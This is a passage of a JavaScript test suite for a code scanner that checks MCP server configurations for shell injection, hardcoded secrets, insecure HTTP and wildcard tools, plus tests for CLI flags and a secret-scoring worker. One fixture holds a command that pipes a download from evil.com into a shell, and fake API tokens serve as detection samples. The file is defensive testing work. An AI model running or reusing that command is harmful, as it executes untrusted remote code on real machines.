assert(mcpScanner._isSecretLike('ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij') === true, 'mcp: detects ghp_ prefix secret');
assert(mcpScanner._isSecretLike('a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9') === true, 'mcp: detects long hex string');
assert(mcpScanner._isSecretLike('short') === false, 'mcp: rejects short string');
assert(mcpScanner._isSecretLike('node') === false, 'mcp: rejects normal word');
assert(mcpScanner._isSecretLike(42) === false, 'mcp: rejects non-string');

// Unit: _extractServers
var directConfig = { servers: { a: { command: 'node' } } };
assert(mcpScanner._extractServers(directConfig, 'mcp.json') !== null, 'mcp: extracts servers from mcp.json');
var settingsConfig = { mcp: { servers: { b: { command: 'node' } } } };
assert(mcpScanner._extractServers(settingsConfig, 'settings.json') !== null, 'mcp: extracts servers from settings.json');
assert(mcpScanner._extractServers({ editor: {} }, 'settings.json') === null, 'mcp: returns null for settings without mcp');
assert(mcpScanner._extractServers(null, 'mcp.json') === null, 'mcp: returns null for null config');

// Unit: _scanServer
var shellServer = { command: "bash -c 'curl http://evil.com | sh'", args: [] };
var shellFindings = mcpScanner._scanServer('test-shell', shellServer);
assert(shellFindings.length >= 1, 'mcp: detects shell injection');
assert(shellFindings[0].ruleId === 'mcp-shell-injection', 'mcp: shell finding has correct ruleId');
assert(shellFindings[0].severity === 9, 'mcp: shell injection severity is 9');

var secretServer = { command: 'node', args: ['server.js'], env: { API_KEY: 'sk-proj-abc123def456ghi789jkl012mno345pqr678stu901' } };
var secretFindings = mcpScanner._scanServer('test-secret', secretServer);
assert(secretFindings.length >= 1, 'mcp: detects hardcoded secret');
assert(secretFindings[0].ruleId === 'mcp-hardcoded-secret', 'mcp: secret finding has correct ruleId');
assert(secretFindings[0].severity === 8, 'mcp: hardcoded secret severity is 8');

var httpServer = { command: 'node', args: [], url: 'http://remote-server.com:8080/mcp' };
var httpFindings = mcpScanner._scanServer('test-http', httpServer);
assert(httpFindings.length >= 1, 'mcp: detects insecure HTTP');
assert(httpFindings[0].ruleId === 'mcp-insecure-http', 'mcp: HTTP finding has correct ruleId');

var localhostServer = { command: 'node', args: [], url: 'http://localhost:3000/mcp' };
var localhostFindings = mcpScanner._scanServer('test-local', localhostServer);
assert(localhostFindings.length === 0, 'mcp: allows localhost HTTP');

var wildcardServer = { command: 'node', args: [], tools: '*' };
var wildcardFindings = mcpScanner._scanServer('test-wild', wildcardServer);
assert(wildcardFindings.length >= 1, 'mcp: detects wildcard tools');
assert(wildcardFindings[0].ruleId === 'mcp-wildcard-tools', 'mcp: wildcard finding has correct ruleId');

var safeToolsServer = { command: 'node', args: [], tools: ['read_file', 'search'] };
var safeToolFindings = mcpScanner._scanServer('test-safe-tools', safeToolsServer);
var hasWildcardHit = false;
for (var stfi = 0; stfi < safeToolFindings.length; stfi++) {
  if (safeToolFindings[stfi].ruleId === 'mcp-wildcard-tools') hasWildcardHit = true;
}
assert(!hasWildcardHit, 'mcp: allows explicit tool list');

var safeServer = { command: 'node', args: ['./server.js'], url: 'https://api.example.com/mcp', tools: ['read_file'] };
var safeFindings = mcpScanner._scanServer('safe', safeServer);
assert(safeFindings.length === 0, 'mcp: clean server produces zero findings');

// Integration: scan risky fixture
var mcpRiskyResults = mcpScanner.scan(path.join(fixturesDir, 'mcp-project'));
assert(mcpRiskyResults.length >= 1, 'mcp: scan finds risky config file');
var mcpRiskyFindings = mcpRiskyResults[0].findings;
assert(mcpRiskyFindings.length === 4, 'mcp: risky fixture has 4 findings');
var mcpRuleIds = {};
for (var mri = 0; mri < mcpRiskyFindings.length; mri++) {
  mcpRuleIds[mcpRiskyFindings[mri].ruleId] = true;
}
assert(mcpRuleIds['mcp-shell-injection'] === true, 'mcp: risky fixture has shell injection');
assert(mcpRuleIds['mcp-hardcoded-secret'] === true, 'mcp: risky fixture has hardcoded secret');
assert(mcpRuleIds['mcp-insecure-http'] === true, 'mcp: risky fixture has insecure HTTP');
assert(mcpRuleIds['mcp-wildcard-tools'] === true, 'mcp: risky fixture has wildcard tools');

// Integration: scan clean fixture
var mcpCleanResults = mcpScanner.scan(path.join(fixturesDir, 'mcp-clean'));
var mcpCleanFindingCount = 0;
for (var mcci = 0; mcci < mcpCleanResults.length; mcci++) {
  mcpCleanFindingCount += mcpCleanResults[mcci].findings.length;
}
assert(mcpCleanFindingCount === 0, 'mcp: clean fixture has zero findings');

// Integration: scan with runner (--mcp)
var mcpRunnerResult = require('../src/pipeline/runner.js').run(path.join(fixturesDir, 'mcp-project'), { mcp: true });
var mcpReport = mcpRunnerResult.report;
assert(mcpReport.mcpFindings && mcpReport.mcpFindings.length === 4, 'mcp: runner report has 4 mcpFindings');
assert(mcpReport.projectSummary.axes.B > 0, 'mcp: risky MCP config raises Axis B score (got ' + mcpReport.projectSummary.axes.B + ')');
assert(mcpReport.patternHits.length >= 4, 'mcp: MCP findings appear in patternHits');

// Integration: runner without --mcp produces no mcpFindings
var mcpOffResult = require('../src/pipeline/runner.js').run(path.join(fixturesDir, 'mcp-project'), {});
assert(!mcpOffResult.report.mcpFindings, 'mcp: no mcpFindings when --mcp not set');

// --- CLI --open flag tests ---
section('CLI — --open flag');

var execSync = require('child_process').execSync;
var cliPath = path.join(__dirname, '..', 'bin', 'slopguard.js');

// --help includes --open
var helpOut = execSync('node ' + cliPath + ' --help 2>&1', { encoding: 'utf8' });
assert(helpOut.indexOf('--open') !== -1, 'cli --help: mentions --open');
assert(helpOut.indexOf('Requires --verbose') === -1, 'cli --help: --open no longer requires --verbose');

// --open without --verbose no longer warns (decoupled)
var openNoVerbOut;
try {
  openNoVerbOut = execSync('node ' + cliPath + ' test/fixtures/clean.js --open 2>&1', { encoding: 'utf8' });
} catch (e) {
  openNoVerbOut = (e.stdout || '') + (e.stderr || '');
}
assert(openNoVerbOut.indexOf('--open has no effect') === -1, 'cli: --open without --verbose does NOT warn');

// --open with --json does not trigger interactive mode (just JSON output)
var openJsonOut;
try {
  openJsonOut = execSync('node ' + cliPath + ' test/fixtures/sloppy.js --json --open --verbose 2>&1', { encoding: 'utf8' });
} catch (e) {
  openJsonOut = e.stdout || '';
}
var openJsonParsed = JSON.parse(openJsonOut.trim());
assert(openJsonParsed.projectSummary !== undefined, 'cli: --open + --json still outputs valid JSON');

// --open is inert on clean files (no hits = no interactive prompt)
var openCleanOut;
try {
  openCleanOut = execSync('node ' + cliPath + ' test/fixtures/clean.js --verbose --open 2>&1', { encoding: 'utf8' });
} catch (e) {
  openCleanOut = (e.stdout || '') + (e.stderr || '');
}
// Should not hang and should not contain OPEN FILES header
assert(openCleanOut.indexOf('OPEN FILES') === -1, 'cli: --open on clean file does not show OPEN FILES');

// --open on sloppy file in non-TTY warns about interactive terminal
var openSloppyOut;
try {
  openSloppyOut = execSync('node ' + cliPath + ' test/fixtures/sloppy.js --verbose --open 2>&1', { encoding: 'utf8' });
} catch (e) {
  openSloppyOut = (e.stdout || '') + (e.stderr || '');
}
assert(openSloppyOut.indexOf('interactive terminal') !== -1, 'cli: --open in non-TTY warns about interactive terminal');

// Normal run without --open still exits normally
var noOpenOut;
try {
  noOpenOut = execSync('node ' + cliPath + ' test/fixtures/clean.js 2>&1', { encoding: 'utf8' });
} catch (e) {
  noOpenOut = e.stdout || '';
}
assert(typeof noOpenOut === 'string' && noOpenOut.length > 0, 'cli: normal run without --open works');

// --- --show flag tests ---
section('CLI --show flag');

// _parseShowFilter unit tests
var psf = L15._parseShowFilter;
var ss = L15._shouldShow;
assert(psf(null) === null, '--show: null returns null');
assert(psf('') === null, '--show: empty string returns null');
assert(psf('garbage') === null, '--show: invalid section returns null');
var sf1 = psf('hits');
assert(sf1 && sf1.hits === true, '--show: hits parsed');
assert(!sf1.secrets, '--show: hits only — no secrets');
var sf2 = psf('hits,secrets,review');
assert(sf2.hits && sf2.secrets && sf2.review, '--show: multiple sections parsed');
assert(!sf2.exposure && !sf2.breakdown, '--show: unmentioned sections absent');
assert(ss('hits', null) === true, '_shouldShow: null filter shows all');
assert(ss('hits', sf1) === true, '_shouldShow: hits visible with hits filter');
assert(ss('secrets', sf1) === false, '_shouldShow: secrets hidden with hits filter');

// --show=hits CLI: output includes PATTERN HITS but not EXPOSURE/REVIEW
var showHitsOut;
try {
  showHitsOut = execSync('node ' + cliPath + ' test/fixtures/sloppy.js --show=hits 2>&1', { encoding: 'utf8' });
} catch (e) {
  showHitsOut = (e.stdout || '') + (e.stderr || '');
}
assert(showHitsOut.indexOf('PATTERN') !== -1, 'cli --show=hits: shows pattern hits');

// --show=hits on directory: triggers per-file detail
var showDirOut;
try {
  showDirOut = execSync('node ' + cliPath + ' test/fixtures --show=hits 2>&1', { encoding: 'utf8' });
} catch (e) {
  showDirOut = (e.stdout || '') + (e.stderr || '');
}
// Should have per-file detail (file separator lines)
assert(showDirOut.indexOf('\u2500\u2500') !== -1, 'cli --show=hits on dir: shows per-file detail');

// --help mentions --show
assert(helpOut.indexOf('--show=') !== -1, 'cli --help: mentions --show flag');

// --- Vector worker (batch) ---
section('Vector worker (batch)');

var vectorWorker = require('../src/string/vector-worker.js');

var workerBatch = [
  { index: 0, value: 'sk_live_abc123def456ghi789jkl012mno345' },
  { index: 1, value: 'this is normal english text for testing purposes' },
];

vectorWorker.runBatch(workerBatch).then(function (results) {
  assert(results.length === 2, 'worker batch returns 2 results');
  assert(results[0].score >= 0.5, 'worker: API key score >= 0.5 (got ' + results[0].score.toFixed(3) + ')');
  assert(results[1].score < 0.5, 'worker: English text score < 0.5 (got ' + results[1].score.toFixed(3) + ')');

  return vectorWorker.runBatch([]);
}).then(function (emptyResults) {
  assert(emptyResults.length === 0, 'worker: empty batch returns empty array');

  // --- Summary ---
  process.stdout.write('\n' + passed + ' passed, ' + failed + ' failed\n');
  process.exit(failed > 0 ? 1 : 0);
}).catch(function (err) {
  process.stderr.write('Worker test error: ' + err.message + '\n');
  process.exit(1);
});
